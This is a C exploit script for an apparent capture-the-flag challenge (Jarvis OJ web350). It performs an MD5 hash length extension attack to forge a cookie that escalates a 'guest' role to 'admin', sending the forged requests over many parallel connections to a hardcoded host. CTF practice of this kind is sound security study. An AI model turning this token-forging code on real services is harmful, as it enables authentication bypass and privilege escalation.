// C standard library
#include <ctype.h>          // isprint in urlencode.
#include <stdio.h>
#include <stdlib.h>         // malloc and EXIT_SUCCESS.
#include <string.h>         // memset, memcpy, strcpy, etc.
// Unix standard
#include <unistd.h>         // syscall read and write.
// Error handling
#include <errno.h>          // errno, error handling.
// Network I/O
#include <arpa/inet.h>      // anything about socket.
// I/O control
#include <fcntl.h>          // O_NONBLOCK for socket.
#include <sys/epoll.h>      // anything about epoll.
// MD5 hash
#include <openssl/md5.h>    // anything about md5.

/**
 * Initialize a client socket with given remote IP and port
 * @return connected socket file descriptor if success, -1 otherwise.
 */
int init_client(remote_ip, remote_port)
    char remote_ip[];      /// remote server IP
    uint16_t remote_port;  /// remote server port
{
    int client = socket(AF_INET, SOCK_STREAM, 0);
    if (client == -1) return client;
    struct sockaddr_in remote = {
        .sin_family = AF_INET,
        .sin_addr = {
            .s_addr = inet_addr(remote_ip),
        },
        .sin_port = htons(remote_port),
        .sin_zero = {0, 0, 0, 0, 0, 0, 0, 0},
    };
    struct sockaddr *server = (struct sockaddr *)&remote;
    int status = connect(client, server, sizeof(struct sockaddr));
    if (status == -1) return -1;
    return client;
}

/**
 * Set O_NONBLOCK flag to file descriptor (fd),
 * i.e. make the file descriptor non-blocking.
 * @return if succeeded returns 0, otherwise -1.
 */
int set_non_block(fd)
    int fd;  /// descriptor of file to be set to non-block.
{
    int flag = fcntl(fd, F_GETFL, 0);
    if (flag == -1) return -1;
    return fcntl(fd, F_SETFL, flag | O_NONBLOCK);
}

/// bytes are always not terminated by '\0', but chars do.
typedef unsigned char byte;

/**
 * Hash Length Extension Attack.
 * Calculate MD5(CONCAT(sec_len, data, padding, want)) from
 * known data, length of sec_len and MD5(CONCAT(sec_len, data)).
 * @return bytes of MD5, not hex digest.
 * The parameter output and output_len is CONCAT(data, padding, want).
 */
byte *MD5_LEA(
        const size_t sec_len,       // length of secret
        const byte data[],          // known data information
        const size_t data_len,
        const byte init_md5[],
        const byte append[],
        const size_t append_len,
        byte output[],
        size_t *output_len
) {
    static const byte fill[] = \
            "                                                                ";
    const size_t ori_len = sec_len + data_len;
    MD5_CTX *ctx = malloc(sizeof(MD5_CTX));
    byte *md5 = malloc(16 * sizeof(byte));
    MD5_Init(ctx);
    for (int i = 0; i != ori_len + 63 >> 6; ++i) MD5_Update(ctx, fill, 64);
    for (int i = 3; i != -1; --i) ctx->A = ctx->A << 8 | init_md5[0 << 2 | i];
    for (int i = 3; i != -1; --i) ctx->B = ctx->B << 8 | init_md5[1 << 2 | i];
    for (int i = 3; i != -1; --i) ctx->C = ctx->C << 8 | init_md5[2 << 2 | i];
    for (int i = 3; i != -1; --i) ctx->D = ctx->D << 8 | init_md5[3 << 2 | i];
    MD5_Update(ctx, append, append_len);
    MD5_Final(md5, ctx);
    memcpy(output, data, data_len);
    *output_len = data_len;
    if (0x38 - *output_len - sec_len & 0x3f) {
        output[(*output_len)++] = '\x80';
        while (0x38 - *output_len - sec_len & 0x3f)
            output[(*output_len)++] = '\0';
    }
    size_t tot_len = data_len + sec_len << 3;
    do output[(*output_len)++] = (byte)tot_len;
    while (tot_len >>= 8);
    while (*output_len + sec_len & 0x3f)
        output[(*output_len)++] = '\0';
    memcpy(output + *output_len, append, append_len);
    *output_len += append_len;
    return md5;
}

/**
 * Convert a integer between [0, 16) to hex.
 * @return Hex format int
 */
char tohex(v)
    int v;
{
    if (0 <= v && v < 10) return v + '0';
    if (10 <= v && v < 16) return v + 'a' - 10;
}

/**
 * Hexlify a sequence of bytes. That is to `tohex' an array of int.
 * @return hexlify result, NUL terminating.
 */
char *hexlify(st, ed)
    const byte *st;
    const byte *ed;
{
    size_t len = ed - st;
    char *hex = malloc(len << 1 | 1);
    for (size_t i = 0; i != len; ++i) {
        hex[i << 1 | 0] = tohex(st[i] >> 4);
        hex[i << 1 | 1] = tohex(st[i] & 0xf);
    }
    hex[len << 1] = '\0';
    return hex;
}

/**
 * Judge whether a char should be urlencoded in HTTP request.
 * Behave like `urllib.parse.quote' in Python.
 * @return TRUE or FALSE.
 */
int need_urlencode(ch)
    const int ch;
{
    if (0x00 <= ch && ch < 0x2d) return 1;
    if (0x3a <= ch && ch < 0x41) return 1;
    if (0x5b <= ch && ch < 0x5f) return 1;
    if (0x60 <= ch && ch < 0x61) return 1;
    if (0x7b <= ch && ch < 0x100) return 1;
    return 0;
}

/**
 * Encode a sequence of bytes.
 * @return pointer to encoded bytes, NUL terminating.
 */
char *urlencode(st, ed)
    byte *st;
    byte *ed;
{
    size_t len = ed - st;
    size_t now = 0;
    char *enc = malloc(len * 3 + 1);
    for (byte *i = st; i != ed; ++i)
        if (need_urlencode(*i)) {
            enc[now++] = '%';
            enc[now++] = tohex(*i >> 4);
            enc[now++] = tohex(*i & 0xf);
        } else enc[now++] = *i;
    enc[now++] = '\0';
    return enc;
}

/**
 * Send decrypt result to Jarvis OJ.
 */
void jarvis_send(fd, role, role_len, hash)
    int fd;
    const char *role;
    const size_t role_len;
    const char *hash;
{
    static const char jarvis_web350[] = "\
GET / HTTP/1.1\r\n\
Host: web.jarvisoj.com:32778\r\n\
Cookie: ";
    char buffer[2048];
    strcpy(buffer, jarvis_web350);
    char *enc_role = urlencode(role, role + role_len);
    char *hex_md5 = hexlify(hash, hash + 16);
    //puts(enc_role);
    //puts(hex_md5);
    strcat(buffer, "hsh=");
    strcat(buffer, hex_md5);
    strcat(buffer, "; role=");
    strcat(buffer, enc_role);
    strcat(buffer, "\r\n\r\n");
    size_t buffer_len = strlen(buffer);
    ssize_t sent = write(fd, buffer, buffer_len);
    while (sent != buffer_len)
        sent += write(fd, buffer + sent, buffer_len - sent);
    free(enc_role); free(hex_md5);
}

int main()
{
    const size_t max_conn = 20;
    const byte role[] = ";\"tseug\":5:s";
    const size_t role_len = strlen((char *)role);
    const byte hsh[] =
            "\x3a\x47\x27\xd5\x74\x63\xf1\x22\x83\x3d\x9e\x73\x2f\x94\xe4\xe0";
    const byte want[] = ";\"nimda\":5:s";
    const size_t want_len = strlen((char *)role);

    int main_epoll = epoll_create(max_conn);
    for (int i = 1; i <= max_conn; ++i) {
        int client_fd = init_client("120.26.131.152", 32778);
        if (client_fd == -1) {
            perror(strerror(errno));
            continue;
        }
        if (set_non_block(client_fd) == -1) {
            perror(strerror(errno));
            continue;
        };
        struct epoll_event ev = {
            .data.fd = client_fd,
            .events = EPOLLIN | EPOLLOUT | EPOLLET,
        };
        int stat = epoll_ctl(main_epoll, EPOLL_CTL_ADD, client_fd, &ev);
        if (stat == -1) {
            perror(strerror(errno));
            continue;
        }
    }

    size_t counter = 0, received = 0;
    while (received != max_conn) {
        struct epoll_event active[20];
        int recover = epoll_wait(main_epoll, active, 20, -1);
        for (int i = 0; i != recover; ++i) {
            int fd = active[i].data.fd, events = active[i].events;
            if (events & EPOLLERR) {
                perror(strerror(errno));
                continue;
            } else if (events & EPOLLIN) {
                byte buffer[1024];
                ssize_t len = 0;
                while (len == 0)
                    len = read(fd, buffer, sizeof buffer);
                for (int j = 0; j != len; ++j) putchar(buffer[j]);
                ++received;
            } else if (events & EPOLLOUT) {
                byte buffer[1024];
                size_t buffer_len;
                byte *md5 = MD5_LEA(
                        counter++,
                        role, role_len,
                        hsh,
                        want, want_len,
                        buffer, &buffer_len);
                for (int it = 0; it != buffer_len >> 1; ++it) {
                    byte swap = buffer[it];
                    buffer[it] = buffer[buffer_len - 1 - it];
                    buffer[buffer_len - 1 - it] = swap;
                }
                jarvis_send(fd, buffer, buffer_len, md5);
                free(md5);
            }
        }
    }
    return EXIT_SUCCESS;
}
